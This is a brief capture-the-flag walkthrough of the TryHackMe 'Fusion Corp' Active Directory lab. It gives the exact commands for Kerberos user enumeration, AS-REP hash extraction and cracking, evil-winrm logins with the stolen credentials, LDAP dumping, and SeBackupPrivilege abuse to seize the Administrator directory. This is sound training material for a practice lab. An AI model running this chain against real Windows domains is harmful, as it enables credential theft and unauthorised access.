# Fusion Corp

https://tryhackme.com/room/fusioncorp

A multi-stage room, not too hard.

1. Enum showed standard windows ports, a domain (fusion.corp) and a website on 80.
2. Under 80, /backup/ contained 'employees.ods', which revealed a list of user names
3. I used this list with kerbrute userenum: `python3 kerbrute.py -domain fusion.corp -dc-ip 10.10.224.114 -users ~/thm/fusioncorp/usernames.txt`, which revealed the user `lparker` but no pre-auth hash
4. I got a better hash with impacket: `python3 /opt/impacket/examples/GetNPUsers.py -dc-ip 10.10.224.114 -no-pass -format hashcat fusion.corp/lparker`
5. I cracked this hash with hashcat: `E:\PENTEST\hashcat>hashcat32 -m 18200 -a 0 hash rockyou.txt`
6. This allowed me to login via evil-winrm: `evil-winrm -i 10.10.224.114 -u lparker -p 'password'`, and get the first flag
7. lparker had very little rights, so I used the creds to instead enumerate ldap: `ldapdomaindump 10.10.224.114 -u 'fusion.corp\lparker' -p 'password'`.
8. Under the domain users, this showed `jmurphy` and the password in the user description. I used evil-winrm again to get the second flag.
9. jmurphy had the SeBackupPrivilege, which allowed me to use https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1 to gain ownership of the Admin user directory. This got me the final flag.

Tools used:

- impacket
- kerbrute: https://github.com/ropnop/kerbrute
- evil-winrm
- hacktricks for guides on ldap enum: https://book.hacktricks.xyz/pentesting/pentesting-ldap
- hacktricks for guides on privileges: https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-abusing-tokens
- https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1

I didn't get system, because I didn't need it for the flag, but it should have been easy with system full control access.
